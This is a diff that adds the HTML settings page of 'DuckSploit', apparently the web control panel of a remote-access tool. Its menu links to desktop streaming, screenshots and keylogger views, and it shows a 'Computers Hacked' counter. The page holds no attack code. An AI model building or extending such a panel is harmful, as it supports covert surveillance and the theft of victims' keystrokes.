@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <title>Settings - DuckSploit Web Hosting (WPH)</title>
+    <meta property="og:title" content="Settings - DuckSploit Web Hosting (WPH)" />
+	<link rel="icon" type="image/png" href="favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="utf-8" />
+    <meta property="twitter:card" content="summary_large_image" />
+    <style data-tag="reset-style-sheet">
+      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6 {  margin: 0;  padding: 0;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}html { scroll-behavior: smooth  }
+    </style>
+	<script src="api/api.js"></script>
+    <style data-tag="default-style-sheet">
+      html {
+        font-family: Inter;
+        font-size: 16px;
+      }
+
+      body {
+        font-weight: 400;
+        font-style:normal;
+        text-decoration: none;
+        text-transform: none;
+        letter-spacing: normal;
+        line-height: 1.15;
+        color: var(--dl-color-gray-black);
+        background-color: var(--dl-color-gray-white);
+
+      }
+    </style>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap"
+      data-tag="font"
+    />
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body onload="logincheck()">
+    <div>
+      <link href="./settings.css" rel="stylesheet" />
+
+      <div class="settings-container">
+        <div class="settings-sidebar">
+          <a
+            href="https://ducksploit.com"
+            target="_blank"
+            rel="noreferrer noopener"
+            class="settings-link"
+          >
+            <img
+              alt="logo"
+              src="public_images/playground_assets/icon2-200h.png"
+              loading="eager"
+              class="settings-image"
+            />
+          </a>
+          <div class="settings-container1">
+            <nav class="settings-nav"></nav>
+            <div class="settings-container2">
+              <a href="index.html" id="link_dashboard" class="settings-navlink">
+                <div class="button-container button-root-class-name36">
+                  <button class="button-button button">
+                    <img
+                      alt="dashboard"
+                      src="public_images/playground_assets/dashboard.png"
+                      class="button-image"
+                    />
+                    <span class="button-text"><span>Dashboard</span></span>
+                  </button>
+                </div>
+              </a>
+              <a
+			    id="link_desktopstream"
+                href="./desktop_stream.html"
+                target="_blank"
+                rel="noreferrer noopener"
+                class="settings-link1"
+              >
+                <div class="button-container button-root-class-name3">
+                  <button class="button-button button">
+                    <img
+                      alt="desktop_stream"
+                      src="public_images/playground_assets/desktop_stream.png"
+                      class="button-image"
+                    />
+                    <span class="button-text"><span>Desktop Stream</span></span>
+                  </button>
+                </div>
+              </a>
+              <a href="screenshot.html"  id="link_screenshots" class="settings-navlink1">
+                <div class="button-container button-root-class-name5">
+                  <button class="button-button button">
+                    <img
+                      alt="screenshots"
+                      src="public_images/playground_assets/screenshot.png"
+                      class="button-image"
+                    />
+                    <span class="button-text"><span>Screenshots</span></span>
+                  </button>
+                </div>
+              </a>
+              <a href="dedicatedwebsite.html"  id="link_website" class="settings-navlink2">
+                <div class="button-container button-root-class-name6">
+                  <button class="button-button button">
+                    <img
+                      alt="dedicated_website"
+                      src="public_images/playground_assets/website.png"
+                      class="button-image"
+                    />
+                    <span class="button-text">
+                      <span>Dedicated website</span>
+                    </span>
+                  </button>
+                </div>
+              </a>
+              <a href="keyloggs.html"  id="link_keyloggs" class="settings-navlink3">
+                <div class="button-container button-root-class-name32">
+                  <button class="button-button button">
+                    <img
+                      alt="keyloggs"
+                      src="public_images/playground_assets/keyloggs.png"
+                      class="button-image"
+                    />
+                    <span class="button-text"><span>Keyloggs</span></span>
+                  </button>
+                </div>
+              </a>
+              <a
+                href="https://discord.gg/sTVWespH4M"
+                target="_blank"
+                rel="noreferrer noopener"
+                class="settings-link2"
+              >
+                <div class="button-container button-root-class-name33">
+                  <button class="button-button button">
+                    <img
+                      alt="discord"
+                      src="public_images/playground_assets/discord.png"
+                      class="button-image"
+                    />
+                    <span class="button-text">
+                      <span>Our discord server</span>
+                    </span>
+                  </button>
+                </div>
+              </a>
+              <a
+                href="https://www.youtube.com/channel/UCFsxrmr-EYp9SMKjvbb0eNw"
+                target="_blank"
+                rel="noreferrer noopener"
+                class="settings-link3"
+              >
+                <div class="button-container button-root-class-name34">
+                  <button class="button-button button">
+                    <img
+                      alt="discord"
+                      src="public_images/playground_assets/youtube.png"
+                      class="button-image"
+                    />
+                    <span class="button-text"><span>Our channel</span></span>
+                  </button>
+                </div>
+              </a>
+            </div>
+          </div>
+        </div>
+        <div class="settings-container3">
+          <div class="settings-container4">
+            <div class="settings-container5">
+              <div class="settings-stats">
+                <div class="settings-stat">
+                  <h1 id="new_users" class="settings-text">0+</h1>
+                  <span class="settings-text01">New users</span>
+                  <span class="settings-text02">
+                    <span>New DuckSploit users totay</span>
+                    <br />
+                  </span>
+                </div>
+                <div class="settings-stat1">
+                  <h1 id="hacker_computers" class="settings-text05">0</h1>
+                  <span class="settings-text06">
+                    <span>Computers Hacked</span>
+                    <br />
+                  </span>
+                  <span class="settings-text09">
+                    <span>Total of hacked computers</span>
+                    <br />
+                  </span>
+                </div>
+                <div class="settings-stat2">
+                  <h1 class="settings-text12">1000+</h1>
+                  <span class="settings-text13">
+                    <span>Hours of developement</span>
+                    <br />
+                  </span>
+                  <span class="settings-text16">
+                    <span>To make DuckSploit</span>
+                    <br />
+                  </span>
+                </div>
+                <div class="settings-stat3">
+                  <h1 id="discord_members" class="settings-text19">0</h1>
+                  <span class="settings-text20">
+                    <span>Members on our Discord server</span>
+                    <br />
+                  </span>
+                  <span class="settings-text23">
+                    <span>At our discord server</span>
+                    <br />
+                  </span>
+                </div>
+              </div>
+              <a
+                href="https://github.com/canarddu38/DUCKSPLOIT"
+                target="_blank"
+                rel="noreferrer noopener"
+                class="settings-link4"
+              >
+                <img
+                  alt="image"
+                  src="https://raw.githubusercontent.com/tholman/github-corners/786d845dbea7f36c1e6c82c59b30dfa4d2d31f23/svg/github-corner-right.svg"
+                  class="settings-image1"
+                />
+              </a>
+            </div>
+            <div class="settings-container6">
+              <h1 class="settings-text26">
+                <span>You&apos;re logged as</span>
+                <br />
+              </h1>
+              <span id="now_username" class="settings-text29">
+                <span>...</span>
+                <br />
+              </span>
+              <div class="settings-container7">
+                <h1 class="settings-text32">
+                  <span>Edit profile</span>
+                  <br />
+                </h1>
+                <input
+                  type="text"
+                  id="username"
+                  placeholder="new username"
+                  class="settings-textinput input"
+                />
+                <input
+                  type="text"
+                  id="password"
+                  placeholder="new password"
+                  class="settings-textinput1 input"
+                />
+                <button id="save" class="settings-button button">
+                  <span>
+                    <span>Save</span>
+                    <br />
+                  </span>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
